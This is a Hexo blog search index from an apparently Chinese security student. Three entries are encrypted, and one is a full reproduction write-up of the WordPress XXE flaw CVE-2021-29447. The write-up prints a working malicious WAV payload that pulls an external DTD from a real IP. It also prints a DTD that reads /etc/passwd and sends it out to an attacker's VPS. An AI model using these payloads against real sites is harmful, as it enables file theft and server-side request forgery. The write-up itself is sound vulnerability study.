<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于综测那些事</title>
      <link href="/2022/09/11/guan-yu-zong-ce-na-xie-shi/"/>
      <url>/2022/09/11/guan-yu-zong-ce-na-xie-shi/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="e62ad585ef8ec66f8f914f03e884c9b760f5bf342b0fd5393d18cc25736151a7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
            <tag> 综测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写于八九之交的大三上开学</title>
      <link href="/2022/08/31/xie-yu-ba-jiu-zhi-jiao-de-da-san-shang-kai-xue/"/>
      <url>/2022/08/31/xie-yu-ba-jiu-zhi-jiao-de-da-san-shang-kai-xue/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="feb22111b155e273cf48f398ed744dea207617217f86f2a8c870fc1b5c10daba">2cf9f0e39f26ddd937cd5eb31197d2f7452e35fa3efd28f8064b6908260648415f4b48f8be62c37589ab75ea4d90e1e905957319865eef32954bf75359f48bedf9c3317142d1169eac50837320441bd0204f059400a1f5e3ab8998a23d2fe0685061d299e8d0371fbf77baf27794bdcf624ce85447d86008f26ed5f5d74ab6863297c1d8f4883d107b4a03b2f03426bb9812963990f52481eeb9ee27fa2f81784ca2d44ba2824e2a3bbe6dacce0502e947943d82429d55a61e545f3f3b4c320bec9a318f021d1631315627a4280b03411b198ec15c9550060a25beebd36599143d2f36cdff98bae2c091706935a6eae48a1ff95f8cdcbd1110d3f51a939582ca8b1b6676184ebee8a1de16660403c77510ec2eee4759a9e461afa67361c2275c840f819f5c0cefa6cba9913e6e1635501a3050d44fe8391107b71344fa68e2cd2aefd49588802afaa6f4e067257b587bb4a68aefa907e1fb6eee31004bd5645423d7b94f69d672fc3df98a1a52e66c7ed9e0a67421bc6dacd6c87e2ec7429a1c802d7ab508255414b8d470014ac8932d9ac6e67c54ba1f69e39b03a3f013c531b259510d607f96993b486a6e7c17be8e3399b93bccd3c2a0644237cbdb8fb86a169bec7868404dea10fd71a212a62aa2610647256b3b42e7e15fe7656b20f3b3341726b89b8c86e2fd3018d84affec75da565c085b245a7ee715155fb0f2667a23f67e775e2fd2a267c42482669e2e1a2e5eccdaec02799347ea31c0d801a26e45cd9c7f2d39ff6c1853182407b7fc766071c8a344ec03bb3e041819e45a4536794ad7f7688df55f58fc2d628f03f034753f8f255a470feda0b94d84307c476533c940893d49924d31b33788af9d908c3cd6eb380aa8302a44ce13c7d4e38a2e069961735895f976a05ebbc95e1acd1e4884ef989a60cac8014430144a264b5acc76c4c8de5329082e25117bf9b67053f68b8a205005371aadd1750aa37b673afe98f1dc5bdad32ae729af651732e5d68cea3c6758266793a7257a59b15e4322086b7050b8a0ed6176e75151f1b6a0ec67be51da0ce80e62cdc25986edf401f2d21e2ebc039597bcc29f00951155f6f45aa57a9e7346e51fd75a32868ee46a123589e3e5c16221201806e001064ed6e9b917db9eddde095c7398387a5575a99ea42c6330b42e7cdd5ae64a09925133dc5d81c0e004a570424f6b0feb0e071c623048ca8616f1be1af390d2f4be3fca338103cee2e98cb259288122e81b7e22f31d95acaa4e9548882232f2a0cd1afce218fcaf92d469ed56632fd6824c02a7a0551479ac0af9e85d6fef403f2695bc6f62824888b0607430bd9e69cacdddef83ac5fe65daed8088b3675088cca44a956738ea9b3b27da3ef55832a76d16216dc5512017ee98f617d19184017512fd1c1622cdc1a60e55ace85d979fea02971630f9471c2e25cd597373dec924175e50f37ee7199294fe589b5479e937647c2cf3b6060594e07db5f485a88321db3dbd7038d7cbb37136707269b2b4d81461361e56cacea82b5515b900979f3c8cbdbdc2978eb10627cca781b2da4b93e0b3590b19a2a877404bf3b69c71c233ce749e1f93c860b67b78bce7d9f568f72a5e1777e1799e2d3d60422b624cc442274d839d0898a53f9b9693b5787cf66ab4bd3f7ef58630693c777b96e1f0d798e0a6d4992f4ea17478c3a69efdb1dec5fad64626fd953db6d8f1a76f0e54f1248965316792f278351c601d4b35c8ff68c49e4e8f42ebe676ea9c19c264efdc5dff1ec5136d8ea6a48213a3c66008c6b38a5b0bf63ca9dfbc700660159a4d30c0f11329fd0fd88833917ec9ceb05e94238c7a3a0913527f897e70f36194c19419e29915b2bc0b7904e917206520c1d4c57648f4044379671a586295094a74fbf022f166d2f9d3dda7645c85bd033ee319501c7d7af4d3a6cd5156104c9ff007eedbb82e68f71baf30d2bacf617768db5cf9223b30f057f80b5a15446ff06d43293f88e89c565e32efa6119c39b86482c90127d81ed7b2603865de1d78f4e0fe533aa4948c199450761e2ec5b840717d241ff10ac958a464ac6776d3b23fc3141a35e420df61dbf23d93dbe631709570d1599b6be63685e0ead972c823354dca2697e38c2fbcf6dad74e87c66e15717617f0b6fe59a7b57689d4436adf944170e5b453f2fb3493ac42cf05c3f7b0d27996b292894461e6266d629c215782c069b6212c02b8f430700eba19defc078365775eea85612ae779b32c721edda1982a4c40e78d5656441bdf256552d18115cee06909e71bdd53f67630fe61de031ec6dfe46482c6a5826d35c508b5bcc6e57238a53eca8b77366b15e5ff8378d3552ee262ba798aede306ccd2202dada1b2782fe66aca31f48c8f6f92219f2ea06b1649454d75b52bc8d6b15114041d3a0324d48fe4427fca23b4a77de826f5d77ddc61c0ee44a75ad671d5b6e59267fa05aff94cac6a548dd23fa1413ddb1553b4e0ea5918d63120ab64889861e3eaccf407068abbaecc28a5dc8d6d9c31f197d417cdd598e55eacbb913ebdf2896be7f35ad914660e52a54aa3817f77eb5553bbee47d515182ea1e908e8359f58449329230f4e4106bb0889e409d01000ff249fcec6cdf0ef7d51166d2ebd6ed707a78644b921784db0e701e6c6e5827f0f6c61b5fd79e8f14a9314ab7b1e9ad982e3970bda81a3cc5e9fd2159e2560896835abc09240c93acb47954f6011de36b152fad165fab8f3391fcb14d62bafdd386791a01eebb1c8f417c72585db462aacf773a74fbac41e043641c84b66eed97ffc7cf5e24413032d05bab4e4d53a3dd71991f8e2185b170fbd44aa6d96c90b4397b7a59653b9698ea404fb2291bef44e47662df68817a772790851f0a07bcee95e765e53bda7db58d30e12f2c8e79bca730982baf232d14e79d8b727f67546d2091ab2156fb1e77d81f54eeeeab3f16ca7d350d8d461de66858ea4af753629966cb1992d3558899618f09fee1784f4a9df25f037b5d9c1e03a9706aa35e10fafb98f4d2e6ecdf0688693aa7098db174d7e7aea6cea7e6dc0ec2d0ec3c26d8c021f1dde34da6b20859ec3f54e1095c72b4cea9b939c3079fedf570103dd8051b42b8679994a6750f4cdd0178def85db91faa587b93d8e0a81db7da79b12ae60a6876ce6ad833ee0a183e899c8265e0573be6715ace25e21e5a4cd16975b7ad9f74d7466aa4c2a4b1d21291806f51c80f34ea03147ded0d4e7921490355adc30ef944424c00107d507764a59bea8a50a1c0de01867d01c827e67f1c4090da44e25220f4f039d7c8cbf4e6cec2bf123629fc77779a1725ec2574d8575d6c56c3c008e23d59f25e6cf628fa0b3b0d2e832b47c714aff611891d3e17f7a657decbf1b4c42c775d8c77de3238b91331d8c0d73d5865d126723ef468cb7bad0d370a739357584767c2659045dec999171ed021dab56feff95699b639604703e83253733a3608dd7d330cfdc73db385b94ed95c0512429dee26f1151e8ddf3dbe335cd58ee198727f750ca0212ff1581f8cae934c6e9a1b0deb619980de3acfdf837291b7e0d7049c4211e7ac07f9053a4f4d8ea2c3d42a81f9dabd102eb5fdbbfa10d1af5b2a36630470211018d13b5cef25a4887e7a5cf5696b754e54560cd1aa0e7e3bdb08d58be38631a1e9c993792a38265aac3c2b609640fb6755155b3a855f68526d6a23657d2d503f3b52c0162ca005fc30a75868e4dd44d4225fbd5dd710c7182638573eb851c63da439a85ad181b602036a9877940ceef9404cdfe667f8d2f5db72bcecef4b4871ab52d3f7975a0a1e4888b1a064adfb816ed4af3759797797dc54d384026918db2579f7142d9e1f5395b0c25bcf5b3847f06a9ea975bcb3f89514e007c56e7445d3b72a0f3ccc78a3a55c2e5e091bae8453e450af74dbf5a4cae2dbc276981413a8e0f7d7fccfdc2a0760ece532dc147022140518e6ca17476a09117c738d1fb5813d27fc65d453c6f396be6587f508cfcd93fd239c3185e7006dfe217fc89b9bb90e69ae50c90fab21a291470403c84b9fa5c4055da4381b572cdac7619e0a7f4a903be76d1abf4c3e1a6dd212dbefd8da390ee0c9c32339f6d7b0a47b05096f85a369cbb71a0ff45b577f32243d11808482dfbb1da83ea41275f3b49c2b71381acedf9028a14b67fec1f39d56355d30805283e6523e4caa5a949935fc3acf1503b826ba9f5177524bc1877f5512a01bcdc8bd71a10fa6db57c4ea56fe84f4a4658c8e34ba672dce9a38c724422a6583a5f48f5f971a9c8efa0a4929fb17dc2a3beb86de5ca19c2bf1066becd25fb9dfa95c002e6ff8f8a7d6296bd453af11a5f89691555bdfa2dd06ff740e8e02c26d0169352b920fc3386612b6a0537055bf124a50b6869d576daf7ae490dc3d9323cc984651549f54128342b0c7037e8b336d01da6f6cc3158537e4648fb51f739189ab2504a23018acfdabfe7814f15e2071b69cb8e5733f82a811ee2a4c2dfa10ec814469ecd89fc963673e85e1209bdd7363c72db5ff53e7078eb7791c29dd7f12a5aceeb44c3d571efdfbf37546c442f25ea4f270d2caf696f34156da80ef806f2b9f868c57ea372917b431ed22768d462c561fce4c2d338322c30ad8ebf079a3ab89e6641f5b5e7dca3f125063931976a7b459a361a330053a25f2f8a47983f2df7769af34c7decad42257e6106ead1d3a3286d0294d81873e247c7b40438f5431f7edf47fe2422922521d1c7b2186b8f60ea35e9d24d16d8b8989196d42fd3cec61d631b719d1ee06bb3c3abf80b6da9984fd301cd51edc629ce7e7ab83e7e3f1c80cf28d564e11953984a818b858b5d8a8c72f028a65ba7c83ea726922a563c3a1be041404a86da8c9cefef608109194f2c175c2f83a90f51b3daf9fc5d3d70ab84bdb8555342d77e7e1359f6e999168d63bd4b2dcb1a2ab8d8dc783abc4e26a43fcbf6cc445d948a36c3dc1415363e6455293007ce13ae19f3bd03ca4609adf4bd568796965ddae3cf1cf17c6f72070c4a59b6515f65433bf40e572b5e009e112a1bd81b8e4673663b978bf15b1d53aa126460b207ef14feb04e7b287429ca576cdbf706482b0fc0123936ee07fc64430fdfcf0e4603902052c7b471a0078c10e4139913b8a101744e86dd1c1a376f683baefdf9f41066eb3e7b862d24bd1d75d2236bace8ad59e7069109c1d3057629891d8c13f294c59a24f3c49a52f5d537399dfc9bfbb9262b7a5d340caec5bb9ea21514afa66ac34fbfce2502b56fe70f3ff3f2202007e824bd6f1966736de8d47ebaec65d0a3526b4be24a4bd01ac3994c7adb7391e89a9e9293bcdfa1459af50d1bd566422dafb6701537ccec6bb7ccae4ab2d1fc467a9bd0d888cc08ba291a939ad005bd829a2705a28dd4728a93a21f96bfef5c5f3ac97b5e18885f2678d61190b92fa577eac95245d1c56feedf15f1741f6c8380908a66eedf22ad3114b222c9b6bd274d306a1a48f65c13b359ec399d0f7675877c43e03c9570c75b39bfb182b1d4bef4e2ce31c2e66a63bb658390cc2a33dc55d981b0fc5d96043df805ff2df33a92c7687519a50d5a26db6b2c5606d4fa312d0d560eda09d69fc47ce859ef6b168225284842af7fe590ab6116b26dc17414823bfcededbc1df15c29ff4f375c6fa3ddbc23423fdbdc53a065ba81825051b4119624920bf694b5e1ca0e4c50d8f7f2b6e9c4913cf5161ab10fe5fde5a6e5cdc12071609490a2fecd05822ddb40448af53bd4583093c1a7ad1e3cdd745255b724a9ab6ce2cfdfd3ffccc9b228ea83817f786cd28d1e0b1e861014ce28d1e22854005835da7abd950052093cef8f4c90b911a2ef41786c8ec3cb5306a49b78366d94c6c82a06f56283d85942a6872cc4e00af5c96e9e55b7f51d60ca520ff76c5253fb0e75a537ead0be99d749c83c017777bd80681b73f4b06d177b68a2321c2946575d8448bf0083473c2dc696924ea3e23ca56a594b4d2264931f4b13b726d0e3a6808ffe2487f64dc370da055b0bf207d83772819f2adf47c465981c1135202bfb41291c50a2f80f5891afdf1f62dca1e6c6951258adf3ac885f0bb5dcfe0adf70b57f5f8b608af3bebe2e151b3baa1824e0e696206106490692d4b90f0d83a8d83c2bbf3a1eb2dc3f092b7801aff574dfb4e975b8b8dc3d970a549f3ca25c069955cb1dacec37599dcb7b762b28af46fb3a1a864e59494f09e3e54bc91cef2321f39f3119062c69a468c9a2ccf7b8845adc947fc7dabcbbbe5167640783fc059ed1cbd92711f2c0cce9788cf5e5232bdb628232cf69f8a820c2a8f36f57177ced784d6da27cf1919db2a38ca990828c70843c3da9c6fa2ff5dd56a6f63f3e28da63daccbc514ed6b5b8bf8825d60c02f795d875b1e10bcd90cd4ca8ce9d985da6221b32a0ecde55a9ce7e34ccd217ded9488a037db98adb451987908ffddfc448a12b384c2a958a8c6b205f22bfa9e56efe6acfa000d9b78c09142efaa52cbba167955b5f37c91be3331153c22793ca3832038d223bf27b0d72ce3c581efcdfbbd933ab69ea44c740b442bfaaed039cef15d46d71d24af8a04e25540f1946fad9240a30c1c74a69b91be20c0364f81885e182b5f7cefeec275361849b569fbf546126dacf8323a95e905dd27dabfc225efe4e93f06f8f35c85352463ea2d1e022510387e78b143feb8bcf27e5829e05b1a8f734d11b8a316135d0230b97715c83e95d71aea443e929dd276f48c86944757235d50625258b6b3160db0bd061dec50bd60defef1c5beafa4b7288ed57c99aaa9d9cdad276791663bf2dd6c14e926d5101b7ba85a1532ef34dad1932132b675fb71b842fd9ee0bc871dfc20bd379c790edcf9972feb8a3dae6d7e5b7c324903d1697673ac881321101a94717ed90b0f8fe9ad06325c57b32402f7e4102ed7f354ab825b62263b752763db9bb09d3e6fb05f34d202c6ab084045139de48808f455cc94fcaedf1f0847ae2e4d222530b2deac6dd9172577410759af53c86f46e12b8ff82f5a93adb08aef0e913f1c4c70e0770988d005ec6db0d19fe698c01a04f222397557f32928f53a8b9e8f59f554d90ee991da03e32895e099583c42be2de7bf5e9b4cedaf6bcb610c5a8c947128af7025b26c891aa3ef6b3d566e42112d1dcef79a9441e0f72eaa283e5ba0367dd8a594742a285c81bc673185d709f654079bb0249d0de522b9b2919755639ca9ec3d902f19076b1b25b551fcc4b4ecc782d5333c9d4ebdb6c5601badde5f0862034d821dc800fd340f3c383cbce6f07182a2653d2ecbf0232e390e9cff64a6e71181e5ae1ac6573e34b1b1d09c84ab5acca51eb8a3970de32590655c90a56a5a726515c19eb894c0e4efbd7208978adc9c860b6d79cd448424f5a31733ab1146301d7933cba52a9e2d6763d86b4317022b9c432464e1aa8e9e6a70597de2bda7fac1fb92b33529bdd05c05866bc200f8e3ea55f03ed836bae84c35dc8b08b2b599ebb96d34163f6693b61f0c17e8b6be3995b90a536fc87e538c22336beee95d7273017ecf5f43083ff0086aa5ad993b53e39ea145bcaa5cab97a98461f9656e1f1b6c9776330075caeea79ce579b4fbcae5cdfdb3249a2ef811c306c13e6181088f15694f85eb1a35d9b5d1bbc37eefcd58e6af99b8f273d1c7717b725c6131b1c7f6825fd26a0e74201153f9a8a69798d0d357eb967439afe3251d974ca701e15bac2d6ac736934365baf9f35ad36b9c1f4e695f967049f05006c998989531562c5a4bf533907fe5485ee57fd76a1394a9691d0656f7583a2256f44dbbb70f43fcc620467687a3d57122302e6c10fbf17a056ad3a34299b709d245adc741ce510e95c761f0fd438108ba7dddaab6a3d1318665c184af9cc6e5e39310a91022d9b7b4b4122ba5585a61a91f0089ca5f5f4c0666d0c4a518e2e32b25cea5f471e684d52bb8270a762fea9b1e19b70e4ac11e27dfe293507b687f589134f293abccbfc9570216f29684081472658b7cd243eaccda081756bc2f16aec4257811fb8333194e5ad7c1bf25792bb23e9d57d80bdbbab0d3c063f8876d9a21144daa38ae734a3ddffc4fb8dd35d2930a56fce5b9315d0a11e30a79595d26f86cc49483c1b5015dac5ebf8ebffce2c5efc03cdec81b1a42cf5181d17d482d2b57618149d4ec02c50ff51c78917ed2bac70af152822192b8d1f9ad069ea828ad25028776c47abdd62fce012fbf2b2b040f59c940bd2403f8bafda5c482d8c86b77a5d3903a5ae656ef23aa5c7cca71b17c14401241346d199ab8f5e32da993e8c1cf43c6adcc6b2e9ca08e6d17ca1c901d6c0b7638e922ecba46ea7f584eda67e2f3951d1ce8fb939ad62408fd2038cccc1b78d795b4184dd969567fc8666c736adcf3e8d27174ca334ba5be8439c5149e9010f932c743b876514c10d810a17d5baf3df2cccd0adad70868ac61a5cf70816177877193028e8f25c24f2b959c36f3b458a82680fa059a8f3f4bce571948e658897b1dadd87e80467e9988202e1cf8e73371ff95abc61ef21e7fc77b8e611ce33bddb883d5cae8523c9d504f5f61e40bf2c43199261a08d3558e2da3b2c1a0ace725a3f8584d0f7088a9633e438b326c30a1aaf06434320c690bde19fb0f466895ec1e19aaccd151f99da258181eed31f7e50116d0a52a3a0c489c07394e4781c2727c23d12571edfdd955176b9fa19158bc249aaa38cb8411b570a4e7e267fd1073fa7426bcc88c76eb6ebf3177851ee575bfd4837f427d329370ee808cf32ddb500fa71ad52f7f444f836618fddc38768fd45c5d4fee2ddd54ff8bc7696274a47d45aaf63a086b2af90579f5363b1eb34ff49fd28bde8ddc17f2398be63d7186ea63f6275b486ef0a447bb54629857f4ebf388055aa98066bca21b0bfcf5120f9c6ae77346f8da5f282a75f906040b1b18892d5145f27cf8bb6af3074a74bfcf11e89618e09a35bdc4016da1c6631927d8d6346cb1770369ff38ca6fb6e58535c36c9c67c78f2445ccc99f5cf4b48f4258df8a8ebb0a1a23ed5fbc39989df06df6cc4ecbee2575d945f3355fadb9ec4c57af65aa5ceb7229ff74ff332a1c2fc5eb92c76fd3d7fd26f56c9e3fe684e97066c0204307119279816caad60f4ac376aee5378ec10c84a00df401639a32b5fb4f3529c04e54c81a9ea8037a4ae46fa871b2eeef5b1d253b5fe336398eb66f9a0f234f831b9cf2f170b56cddeab653a13b4f9d363323857bddae3503407dd064ea1be4f886fa7976e247eaf1841a808afe6c98dc3c647755b38891e0794dde041d271010e89e02ee588d366a3368564d2bbd9ad034965123fd8e99cc7a2991e545cbfb2d72883ba47fa202e039ee2206a4d16e511dfd38faf180c308bbfb13c067dbbddf09830a263fbc25444a80315f0cf61e0a9bb445f1b8844c125d0c666d54929c89359a38ef735bc945227a10fd2143d00736c72d3a2b4445161eadfd33cee8d140c0d04ece76376bf554c9769f720a31c47fdaf55117bc7ef59aee412204cac478bee1b6139e0c071d734ca3ff93c6f18331752c587bb01d3e93b4a0611d1ac285ed1f9e2e6cce7e5c8f9fd7f50493e4e7d114058f424576ed14302adf4c85c4914469ed2873572e730db5e75b831eb4d59777c72a286d6a1f6784c459940cadd972e4e38c16413b8d76e054c00e1903914aeb12bbc519adbf99f638e84d301eafccce849afaa6b17eff8facb2c62f35f804c8a1085fb423c273411a23c368f67ca3a8f37789537112f044047a0ff12d6f7cb268d0a9ac394237adea3821c3d82a25e68599e6b9c97a7137db1bbeead7ac444e2ca717034f29b3618757dec52ee0c596cbc28dc309eb2f0bf86e14af1ce51d00212be90a798fb5fe8ed9c30dc4d39843eb6bbacd406efdeb80504c238c60df</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不同长度字符的命令执行</title>
      <link href="/2022/05/16/bu-tong-chang-du-zi-fu-de-ming-ling-zhi-xing/"/>
      <url>/2022/05/16/bu-tong-chang-du-zi-fu-de-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="b401191290ea4c5421c14bcf6ef21e32347c17a9a07ef5ba1316eead28f8d97d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-29447</title>
      <link href="/2022/05/08/cve-2021-29447/"/>
      <url>/2022/05/08/cve-2021-29447/</url>
      
        <content type="html"><![CDATA[<h2 id="WordPress在PHP8下经过身份验证的媒体库XXE漏洞"><a href="#WordPress在PHP8下经过身份验证的媒体库XXE漏洞" class="headerlink" title="WordPress在PHP8下经过身份验证的媒体库XXE漏洞"></a>WordPress在PHP8下经过身份验证的媒体库XXE漏洞</h2><h2 id="CVE-2021-29447"><a href="#CVE-2021-29447" class="headerlink" title="CVE-2021-29447"></a>CVE-2021-29447</h2><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>WordPress是一款能建立出色网站、博客或应用程序的开源软件。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h3><p>研究人员在WordPress中新发现了一个的XXE漏洞(CVE-2021-29447)，远程攻击者可以利用该漏洞访问任意内部文件，并实现服务器端请求伪造(SSRF)。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>主要是在<code>wp-includes/ID3/getid3.lib.php</code></p><p><img src="/images/xml/code.png" class="lazyload placeholder" data-srcset="/images/xml/code.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img">   </p><p>wordpress有一个媒体库，经过身份验证的用户可以上传媒体文件以便后续使用，再上传媒体文件时，wordpress会调用getid3这个库，提取上传媒体文件的元信息，其中一些数据会以XML的格式进行解析，因此所以在一定条件下会导致XXE漏洞。2014年，WordPress 3.9.2中添加了一个禁用外部实体libxml_disable_entity_loader(true)的调用，以修复一个XXE漏洞。随着php8的发布，有关的代码被略作修改，以适应libxml_disable_entity_loader()函数的弃用。因为PHP新版本使用Libxml2 v2.9+，默认情况下会禁用外部实体获取。因此，只有当运行的PHP版本＜8时，才需调用该函数。所以当php大于等于8时，便可以利用这个特点。虽然simplexml_load_string()函数调用并不是默认的。即使名称可能不建议使用，LIBXML_NOENT标志也会启用实体替换。在这种情况下，LIBXML_NOENT意味着结果中将不保留任何实体，因此将提取并替换外部实体。如此一来，便可以在运行PHP 8的WordPress上，利用已在WordPress 3.9.2中修复的XXE漏洞。</p><h3 id="影响产品："><a href="#影响产品：" class="headerlink" title="影响产品："></a>影响产品：</h3><p><img src="/images/xml/version.png" class="lazyload placeholder" data-srcset="/images/xml/version.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="/images/xml/recover.png" class="lazyload placeholder" data-srcset="/images/xml/recover.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p><p>重新引入libxml_disable_entity_loader(true)的调用，或者重新引入另外一种方法libxml_set_external_entity_loader（）</p><h2 id="漏洞调试环境搭建"><a href="#漏洞调试环境搭建" class="headerlink" title="漏洞调试环境搭建"></a>漏洞调试环境搭建</h2><p>可以去WPScan官网下载对应版本手动搭建，例如下面的5.6.2版本：</p><p><a href="https://wpscan.com/wordpress/562">https://wpscan.com/wordpress/562</a></p><p>也能使用docker直接搭建：</p><p><a href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></p><h2 id="漏洞利用及代码分析"><a href="#漏洞利用及代码分析" class="headerlink" title="漏洞利用及代码分析"></a>漏洞利用及代码分析</h2><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>利用下方语句构造wave格式的恶意音频文件，主要就是使用最小必要的wave结构加上恶意有效载荷得到payload.wav</p><pre class="line-numbers language-none"><code class="language-none">echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在自己的VPS下写入evil.dtd</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.default&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY %init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;?p&#x3D;%file&#39;&quot;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后在该目录下用php启动一个web服务器</p><pre class="line-numbers language-none"><code class="language-none">php -S 0.0.0.0:PORT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用户登录wordpress在媒体库上传上面精心构造的payload.wav就可以实现ssrf，访问内部的任意文件，外带出base64加密和zlib压缩过的内容。  </p><p>最后通过php解出实际内容即可</p><pre class="line-numbers language-none"><code class="language-none">echo zlib_decode(base64_decode(&#39;内容&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h3><p>在&#x2F;wp-admin界面登录一个有上传媒体文件权限的用户，然后在&#x2F;wp-admin&#x2F;media-new.php上传（linux下使用docker搭建的环境上传不会报错，但是windows下用phpstudy搭建的上传会报错，虽然报错但是仍有信息被外带出来了）：  </p><p><img src="/images/xml/upload.png" class="lazyload placeholder" data-srcset="/images/xml/upload.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">    </p><p>触发外带出有效信息：  </p><p><img src="/images/xml/get.png" class="lazyload placeholder" data-srcset="/images/xml/get.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>最后php解压和解密即可：</p><p><img src="/images/xml/decode.png" class="lazyload placeholder" data-srcset="/images/xml/decode.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>经过尝试，文件如果到达一定的长度后是外带不出来的。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p> 上传恶意wav文件，debug一下，大致的函数结构如下：</p><p><img src="/images/xml/function.png" class="lazyload placeholder" data-srcset="/images/xml/function.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p> 在解析xml的地方下了断点，可以看到当php版本大于8.0时，没有进入那两个if，就不会禁用外部实体，就会进行解析，这里自己的vps就已经可以收到结果了，因此造成了xxe注入。</p><p> <img src="/images/xml/getid3.png" class="lazyload placeholder" data-srcset="/images/xml/getid3.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过本次CVE的复现，加深了我对xxe的一些基础知识的理解，知道了xxe外部实体注入漏洞是如何产生的，并且如何进行修复。对于xml和dtd的基础知识也有了一定的了解，能够进行一定程度上的运用。学习到了在xxe实体注入时，没有回显可以使用vps将ssrf得到信息外带出来。最后，还有再次学习了如何使用docker搭建环境，确实十分方便。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://cn-sec.com/archives/362965.html">http://cn-sec.com/archives/362965.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/368864884">https://zhuanlan.zhihu.com/p/368864884</a></p><p><a 